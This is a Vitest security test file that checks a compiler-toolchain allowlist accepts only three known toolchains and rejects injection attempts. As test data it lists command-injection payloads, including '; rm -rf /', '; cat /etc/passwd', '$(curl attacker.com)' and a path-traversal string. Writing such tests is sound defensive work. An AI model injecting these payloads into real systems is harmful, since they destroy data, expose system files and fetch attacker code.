/**
 * Tests for #488: Validate compiler toolchains against an allowlist.
 *
 * Security regression tests to ensure only known toolchain identifiers
 * are accepted, preventing command injection attacks.
 */
import { describe, it, expect } from 'vitest';
import { ToolchainEnum, SUPPORTED_TOOLCHAINS } from '../src/api/compiler';

describe('ToolchainEnum - Zod validation', () => {
  it('accepts all supported toolchains', () => {
    const validToolchains = Object.keys(SUPPORTED_TOOLCHAINS);
    for (const tc of validToolchains) {
      const result = ToolchainEnum.safeParse(tc);
      expect(result.success, `Expected "${tc}" to be valid`).toBe(true);
      if (result.success) {
        expect(result.data).toBe(tc);
      }
    }
  });

  it('rejects unknown toolchain identifiers', () => {
    const malicious = [
      'malicious-toolchain',
      'soroban-cli@0.9.4; rm -rf /',
      'soroban-cli@0.9.4$(whoami)',
      '../../../etc/passwd',
      '',
      'random-cli@1.0.0',
      'stellar-cli@999.999.999',
    ];

    for (const tc of malicious) {
      const result = ToolchainEnum.safeParse(tc);
      expect(result.success, `Expected "${tc}" to be rejected`).toBe(false);
    }
  });

  it('rejects command injection attempts in toolchain field', () => {
    const commandInjectionPayloads = [
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '&& whoami',
      '$(id)',
      '`id`',
      '$(curl attacker.com)',
      '; rm -rf /',
      '| rm -rf /',
      'soroban;echo pwned',
      'soroban|echo pwned',
    ];

    for (const payload of commandInjectionPayloads) {
      const result = ToolchainEnum.safeParse(payload);
      expect(result.success, `Command injection payload should be rejected: ${payload}`).toBe(
        false,
      );
    }
  });

  it('returns appropriate error message for invalid toolchains', () => {
    const result = ToolchainEnum.safeParse('invalid-toolchain');
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error).toBeDefined();
      expect(result.error.issues[0].message).toContain('Invalid enum value');
    }
  });

  it('returns appropriate error for missing required toolchain', () => {
    const result = ToolchainEnum.safeParse(undefined);
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error.issues[0].message).toContain('toolchain field is required');
    }
  });
});

describe('SUPPORTED_TOOLCHAINS - Allowlist integrity', () => {
  it('contains exactly three toolchains', () => {
    expect(Object.keys(SUPPORTED_TOOLCHAINS)).toHaveLength(3);
  });

  it('has correct binary mappings', () => {
    expect(SUPPORTED_TOOLCHAINS['soroban-cli@0.9.4']).toBe('soroban');
    expect(SUPPORTED_TOOLCHAINS['stellar-cli@21.0.0']).toBe('stellar');
    expect(SUPPORTED_TOOLCHAINS['cargo-contract@4.0.0']).toBe('cargo-contract');
  });
});
